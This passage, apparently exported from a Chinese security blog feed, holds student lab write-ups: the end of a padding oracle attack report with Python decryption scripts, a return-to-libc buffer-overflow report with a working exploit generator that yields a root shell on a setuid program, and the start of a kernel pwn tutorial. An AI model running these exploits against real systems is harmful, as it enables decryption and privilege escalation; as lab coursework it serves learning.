   D2[<span class="number">3</span>]  = C1[<span class="number">3</span>]</span><br><span class="line">    D2[<span class="number">4</span>]  = C1[<span class="number">4</span>]</span><br><span class="line">    D2[<span class="number">5</span>]  = C1[<span class="number">5</span>]</span><br><span class="line">    D2[<span class="number">6</span>]  = C1[<span class="number">6</span>]</span><br><span class="line">    D2[<span class="number">7</span>]  = C1[<span class="number">7</span>]</span><br><span class="line">    D2[<span class="number">8</span>]  = C1[<span class="number">8</span>]</span><br><span class="line">    D2[<span class="number">9</span>]  = C1[<span class="number">9</span>]</span><br><span class="line">    D2[<span class="number">10</span>] = C1[<span class="number">10</span>]</span><br><span class="line">    D2[<span class="number">11</span>] = C1[<span class="number">11</span>]</span><br><span class="line">    D2[<span class="number">12</span>] = C1[<span class="number">12</span>]</span><br><span class="line">    D2[<span class="number">13</span>] = C1[<span class="number">13</span>]</span><br><span class="line">    D2[<span class="number">14</span>] = C1[<span class="number">14</span>]</span><br><span class="line">    D2[<span class="number">15</span>] = C1[<span class="number">15</span>]</span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># In the experiment, we need to iteratively modify CC1</span></span><br><span class="line">    <span class="comment"># We will send this CC1 to the oracle, and see its response.</span></span><br><span class="line">    CC1 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    CC1[<span class="number">0</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">1</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">2</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">3</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">4</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">5</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">6</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">7</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">8</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">9</span>]  = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">10</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">11</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">12</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">13</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">14</span>] = <span class="number">0x00</span></span><br><span class="line">    CC1[<span class="number">15</span>] = <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line">    <span class="comment"># In each iteration, we focus on one byte of CC1.  </span></span><br><span class="line">    <span class="comment"># We will try all 256 possible values, and send the constructed</span></span><br><span class="line">    <span class="comment"># ciphertext CC1 + C2 (plus the IV) to the oracle, and see </span></span><br><span class="line">    <span class="comment"># which value makes the padding valid. </span></span><br><span class="line">    <span class="comment"># As long as our construction is correct, there will be </span></span><br><span class="line">    <span class="comment"># one valid value. This value helps us get one byte of D2. </span></span><br><span class="line">    <span class="comment"># Repeating the method for 16 times, we get all the 16 bytes of D2.</span></span><br><span class="line"></span><br><span class="line">    K = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">          CC1[<span class="number">16</span> - K] = i</span><br><span class="line">          status = oracle.decrypt(IV + CC1 + C2)</span><br><span class="line">          <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;CC1: &quot;</span> + CC1.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="comment">###############################################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">    P2 = xor(C1, D2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P2:  &quot;</span> + P2.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>运行后可得结果，可以看到成功解出C1末位为0xcf时，padding正确，所以可以得出D2末位为<code>0xcf xor 0x01 = 0xce</code>：</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231231105351823.png" alt="image-20231231105351823"></p>
<p>然后修改C1末位为<code>0xce xor 0x02</code>尝试C1倒数第二位解出使padding为0x02的valid情况，得到D2后两位<code>0x3b0xce</code></p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231231105716391.png" alt="image-20231231105716391"></p>
<p>以此类推，可以得出D2值以及P2值：</p>
<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231231111128460.png" alt="image-20231231111128460"></p>
<h2 id="5-Task-3：Padding-Oracle-Attack（Level-2）"><a href="#5-Task-3：Padding-Oracle-Attack（Level-2）" class="headerlink" title="5. Task 3：Padding Oracle Attack（Level 2）"></a>5. Task 3：Padding Oracle Attack（Level 2）</h2><p>自动化进程，并获取所有分组的密文。</p>
<p>构造脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(first, second))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracle</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="variable language_">self</span>.s.connect((host, port))</span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.ctext = unhexlify(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ctext: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._send(hexlify(ctext))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self</span>):</span><br><span class="line">        resp = <span class="variable language_">self</span>.s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="keyword">return</span> resp </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, hexstr: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.send(hexstr + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    oracle = PaddingOracle(<span class="string">&#x27;10.9.0.80&#x27;</span>, <span class="number">6000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the IV + Ciphertext from the oracle</span></span><br><span class="line">    iv_and_ctext = <span class="built_in">bytearray</span>(oracle.ctext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(iv_and_ctext))</span><br><span class="line">    <span class="comment"># Num of ctext</span></span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">len</span>(iv_and_ctext)/<span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        C = iv_and_ctext[(n)*<span class="number">16</span>: (n+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;IV:  &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;C<span class="subst">&#123;n&#125;</span>: &quot;</span> + C.<span class="built_in">hex</span>())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># initialize D, IV, P</span></span><br><span class="line">        D = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        CC = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        P = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Solve D</span></span><br><span class="line">        <span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                CC[<span class="number">16</span> - K] = i</span><br><span class="line">                <span class="comment"># initialize input</span></span><br><span class="line">                tmp_input = iv_and_ctext[<span class="number">0</span>:(n+<span class="number">2</span>)*<span class="number">16</span>]</span><br><span class="line">                tmp_input[n*<span class="number">16</span>:(n+<span class="number">1</span>)*<span class="number">16</span>] = CC</span><br><span class="line">                status = oracle.decrypt(tmp_input)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="string">&quot;Valid&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Valid: i = 0x&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;D: &quot;</span>+ D.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;CC: &quot;</span> + CC.<span class="built_in">hex</span>())</span><br><span class="line">                    <span class="comment"># Update D</span></span><br><span class="line">                    D[<span class="number">16</span> - K] = i^K</span><br><span class="line">                    <span class="comment"># Update CC</span></span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, K+<span class="number">1</span>):</span><br><span class="line">                        CC[<span class="number">16</span> - j] = D[<span class="number">16</span> - j]^(K+<span class="number">1</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Once you get all the 16 bytes of D2, you can easily get P2</span></span><br><span class="line">        P = xor(C, D)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P:  &quot;</span> + P.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            plain_text += <span class="built_in">chr</span>(P[j])</span><br><span class="line">            </span><br><span class="line">       </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Plaintext: &quot;</span> + plain_text) </span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2024-1-1-Padding_Oracle%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231231130753727.png" alt="image-20231231130753727"></p>
]]></content>
      <tags>
        <tag>密码</tag>
        <tag>Padding Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络攻防大作业】Return_to_libc实验报告</title>
    <url>/posts/8a8d28bf.html</url>
    <content><![CDATA[<h2 id="Return-to-libc-WriteUp"><a href="#Return-to-libc-WriteUp" class="headerlink" title="Return_to_libc WriteUp"></a>Return_to_libc WriteUp</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><ul>
<li><p>修改flag为学号</p>
</li>
<li><p>构建docker镜像（运行<code>sudo ./build.sh</code>，注意<code>chmod +x</code>修改权限），连接不稳定，可能需要多次尝试</p>
</li>
<li><p>开启docker，禁用ASLR。</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231144427491.png" alt="image-20231231144427491"></p>
</li>
<li><p>使用<code>netstat -antp</code>查看ssh服务状态</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231144545863.png" alt="image-20231231144545863"></p>
</li>
<li><p>登录容器<code>ssh 0.0.0.0 -p 49153 -l seed</code></p>
</li>
</ul>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><p>运行镜像中vuln程序，vuln有setuid权限，因此可以尝试通过此来获取root shell。</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231145335514.png" alt="image-20231231145335514"></p>
<p>查看vuln源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ebp into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));      </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print out information for experiment purpose */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> input[<span class="number">1000</span>];</span><br><span class="line">   FILE *badfile;</span><br><span class="line"></span><br><span class="line">   badfile = fopen(<span class="string">&quot;/home/seed/the_file&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">int</span> length = fread(input, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1000</span>, badfile);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Address of input[] inside main():  0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) input);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line"></span><br><span class="line">   bof(input);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;(^_^)(^_^) Returned Properly (^_^)(^_^)\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现输入<code>input</code>长度可以达到1000，可以造成栈溢出攻击获取root shell。</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231145600873.png" alt="image-20231231145600873"></p>
<p>另外发现docker镜像中已将zsh链接到sh，因此只需构造环境变量<code>/bin/sh</code>，使用<code>system(&#39;/bin/sh&#39;)</code>获取shell即可。<code>system</code>，<code>exit</code>地址如下。</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231152925920.png" alt="image-20231231152925920"></p>
<p>根据vuln返回信息可以获取到input、buffer地址以及栈帧基址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">seed /home/seed % vuln</span><br><span class="line">Address of input[] inside main():  0xffffd8d0</span><br><span class="line">Input size: 66</span><br><span class="line">Address of buffer[] inside bof():  0xffffd7e4</span><br><span class="line">Frame Pointer value inside bof():  0xffffd8b8</span><br></pre></td></tr></table></figure>



<p>可以计算出从buffer需要溢出<code>0xffffd8b8-0xffffd7e4 = 212</code>个字节可以溢出到ebp。然后ebp返回地址上填入system地址，并添加参数和exit返回地址即可。</p>
<p>参数<code>/bin/sh</code>尝试使用环境变量实现。</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231153450024.png" alt="image-20231231153450024"></p>
<p>构造脚本<code>genv.c</code>获取环境变量地址，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (shell)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译genv并上传，获取到<code>/bin/sh</code>地址<code>0xffffdfd5</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 genv.c -o genv</span><br><span class="line">scp -P 49153 ./genv seed@0.0.0.0:/home/seed</span><br></pre></td></tr></table></figure>

<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231153928103.png" alt="image-20231231153928103"></p>
<p>构造python脚本，并上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">input_addr	= <span class="number">0xffffd8c0</span></span><br><span class="line">buffer_addr	= <span class="number">0xffffd7d4</span></span><br><span class="line">ebp_addr	= <span class="number">0xffffd8a8</span> </span><br><span class="line">system_addr	= <span class="number">0xf7e19360</span>   <span class="comment"># The address of system()</span></span><br><span class="line">exit_addr	= <span class="number">0xf7e0bec0</span></span><br><span class="line">sh_addr = <span class="number">0xffffdfd2</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">Y = ebp_addr - buffer_addr + <span class="number">4</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (system_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = Y + <span class="number">8</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (sh_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = Y + <span class="number">4</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;the_file&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -P 49153 ./exp.py seed@0.0.0.0:/home/seed</span><br></pre></td></tr></table></figure>

<p>修改文件权限并执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 exp.py</span><br><span class="line">chmod 755 the_file</span><br><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>

<p>其中发现”&#x2F;bin&#x2F;sh”环境变量存在偏移0x3，对exp.py稍作修改后重新运行，成功获取到root shell，获取到flag。</p>
<p><img src="/img/posts/2024-1-1-Return_to_libc.assets/image-20231231154624159.png" alt="image-20231231154624159"></p>
]]></content>
      <tags>
        <tag>Pwn</tag>
        <tag>Return to libc</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel Pwn 学习之路(一)</title>
    <url>/posts/54828bfc.html</url>
    <content><![CDATA[<h1 id="Kernel-Pwn-学习之路-一"><a href="#Kernel-Pwn-学习之路-一" class="headerlink" title="Kernel Pwn 学习之路(一)"></a>Kernel Pwn 学习之路(一)</h1><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/140338884">Kernel Pwn 学习之路（一）</a></p>
<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>本文主要介绍Kernel的相关知识以及栈溢出在Kernel中的利用。</p>
<h2 id="2-Kernel简介"><a href="#2-Kernel简介" class="headerlink" title="2. Kernel简介"></a>2. Kernel简介</h2><p><strong>本部分全文引用了CTF-Wiki的相关内容。</strong></p>
<h3 id="2-1-什么是Kernel"><a href="#2-1-什么是Kernel" class="headerlink" title="2.1 什么是Kernel"></a>2.1 什么是Kernel</h3><p>kernel也是一个程序，用来管理软件发出的数据I&#x2F;O请求，讲这些要求转译为指令，交给CPU和计算机中的其他组件处理，kernel是现代操作系统最基本的部分。</p>
<p>Kernel最主要的功能有以下两点：</p>
<ul>
<li>控制并与硬件进行交互</li>
<li>提供application能运行的环境</li>
</ul>
<p>包括I&#x2F;O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。需要注意的是：<strong>kernel的crash通常会引起重启</strong></p>
<h3 id="2-2-Ring-模型"><a href="#2-2-Ring-模型" class="headerlink" title="2.2 Ring 模型"></a>2.2 Ring 模型</h3><p>intel CPU 将CPU的特权级别分为4个级别：Ring 0， Ring1，… ，Ring3。</p>
<p>Ring0只给OS使用，Ring3所有程序都可以使用，内层Ring可以随便使用外层Ring的资源。提升系统安全性</p>
<p>大多数操作系统只使用了Ring0，Ring3。</p>
<h3 id="2-3-状态切换"><a href="#2-3-状态切换" class="headerlink" title="2.3 状态切换"></a>2.3 状态切换</h3><h4 id="User-space-to-kernel-space"><a href="#User-space-to-kernel-space" class="headerlink" title="User space to kernel space"></a>User space to kernel space</h4><p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体过程为：</p>
<ol>
<li><p>通过swapgs切换GS段寄存器，将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行的GS值使用。</p>
</li>
<li><p>将当前栈顶（用户控件栈顶）记录在CPU独占变量区域中，将CPU独占区域里记录的内核栈顶放入RSP&#x2F;ESP</p>
</li>
<li><p>通过push保存各寄存器值，具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">/* 保存栈值，并设置内核栈 */</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS                /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS                /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx                      /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax                      /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi                      /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi                      /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx                      /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu               /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS                  /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8                       /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9                       /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10                      /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11                      /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp                 /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过汇编指令判断是否为x32_abi（x32架构的程序）</p>
</li>
<li><p>通过系统调用号，跳到全局变量sys_call_table相应位置继续执行系统调用。</p>
</li>
</ol>
<h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p>
<ol>
<li>通过swapgs恢复GS值</li>
<li>通过sysretq或者iretq恢复到用户空间继续执行。如果iretq还需要给出用户空间的一些信息（CS，eflags&#x2F;rflags，esp&#x2F;rsp等）</li>
</ol>
<h3 id="2-4-Syscall系统调用"><a href="#2-4-Syscall系统调用" class="headerlink" title="2.4 Syscall系统调用"></a>2.4 Syscall系统调用</h3><p><strong>系统调用：</strong>指的是用户空间的程序向操作系统内核请求更高权限的服务，比如I&#x2F;O操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如scanf，puts等I&#x2F;O相关函数实际上是对系统调用（eg: read, write）的封装）</p>
<p>系统调用号可以在<code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code>和<code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code>查看。</p>
<p>系统调用号查询：<code>Linux Syscall Reference</code>和<code>Linux Syscall64 Reference</code></p>
<h3 id="2-5-ioctl设备通信"><a href="#2-5-ioctl设备通信" class="headerlink" title="2.5 ioctl设备通信"></a>2.5 ioctl设备通信</h3><p>ioctl官方手册(<code>shell: man 2 ioctl</code>)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of</span><br><span class="line">       special files.  In particular, many operating characteristics of  char‐</span><br><span class="line">       acter  special  files  (e.g., terminals) may be controlled with ioctl()</span><br><span class="line">       requests.  The argument fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third  ar‐</span><br><span class="line">       gument  is an untyped pointer to memory.  It&#x27;s traditionally char *argp</span><br><span class="line">       (from the days before void * was valid C), and will  be  so  named  for</span><br><span class="line">       this discussion.</span><br><span class="line"></span><br><span class="line">       An  ioctl() request has encoded in it whether the argument is an in pa‐</span><br><span class="line">       rameter or out parameter, and the size of the argument argp  in  bytes.</span><br><span class="line">       Macros and defines used in specifying an ioctl() request are located in</span><br><span class="line">       the file &lt;sys/ioctl.h&gt;.  See NOTES.</span><br><span class="line"></span><br><span class="line">RETURN VALUE</span><br><span class="line">       Usually, on success zero is returned.  A few ioctl() requests  use  the</span><br><span class="line">       return  value  as an output parameter and return a nonnegative value on</span><br><span class="line">       success.  On error, -1 is returned, and errno is set appropriately.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出ioctl也是一个系统调用，用于与设备通信。</p>
<p>int ioctl(int fd, unsigned long request, …) 的第一个参数为打开设备 (open) 返回的 文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。<br><strong>使用 ioctl 进行通信的原因：</strong></p>
<ul>
<li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</li>
<li>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</li>
